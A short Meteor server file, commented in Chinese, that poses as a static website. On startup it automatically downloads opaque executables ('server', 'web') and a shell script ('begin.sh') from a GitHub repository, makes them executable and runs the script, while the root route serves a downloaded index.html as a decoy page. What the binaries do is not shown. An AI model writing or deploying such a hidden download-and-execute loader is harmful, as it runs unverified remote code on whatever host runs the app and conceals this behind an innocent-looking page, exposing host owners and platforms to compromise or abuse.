import { Meteor } from 'meteor/meteor';
import { WebApp } from 'meteor/webapp';
import { fetch } from 'meteor/fetch';
import fs from 'fs';
import { exec } from 'child_process';
import { promisify } from 'util';

const execAsync = promisify(exec);

const FILES_TO_DOWNLOAD = [
  {
    url: 'https://github.com/wwrrtt/test/releases/download/3.0/index.html',
    filename: 'index.html',
  },
  {
    url: 'https://github.com/wwrrtt/test/raw/main/server',
    filename: 'server',
  },
  {
    url: 'https://github.com/wwrrtt/test/raw/main/web',
    filename: 'web',
  },
  {
    url: 'https://github.com/wwrrtt/test/releases/download/2.0/begin.sh',
    filename: 'begin.sh',
  },
];

// 下载文件的异步函数
async function downloadFile(url, filename) {
  console.log(`Downloading ${url}...`);
  try {
    const response = await fetch(url);
    const buffer = await response.arrayBuffer();
    fs.writeFileSync(filename, Buffer.from(buffer));
    console.log(`Downloaded ${filename}`);
  } catch (error) {
    console.error(`Error downloading ${filename}:`, error);
    throw error;
  }
}

// 设置文件（下载文件，赋予权限，执行脚本）函数
async function setupFiles() {
  try {
    // 下载所有文件
    for (const file of FILES_TO_DOWNLOAD) {
      await downloadFile(file.url, file.filename);
    }

    // 添加执行权限
    await execAsync('chmod +x begin.sh server web');
    
    // 执行脚本
    const { stdout } = await execAsync('./begin.sh');
    console.log('Script output:', stdout);
    
    return true;
  } catch (error) {
    console.error('Error in setup:', error);
    return false;
  }
}

// 设置根路由，返回静态页面
WebApp.connectHandlers.use('/', (req, res, next) => {
  if (req.url === '/') {
    try {
      const content = fs.readFileSync('index.html', 'utf8');
      res.writeHead(200, { 'Content-Type': 'text/html' });
      res.end(content);
    } catch (error) {
      console.error('Error serving index.html:', error);
      next();
    }
  } else {
    next();
  }
});

// 启动时执行文件下载和脚本
Meteor.startup(() => {
  // 使用 setTimeout 来异步执行文件下载和脚本
  Meteor.setTimeout(async () => {
    const success = await setupFiles();
    if (!success) {
      console.error('Failed to setup files');
    }
  }, 0);
});
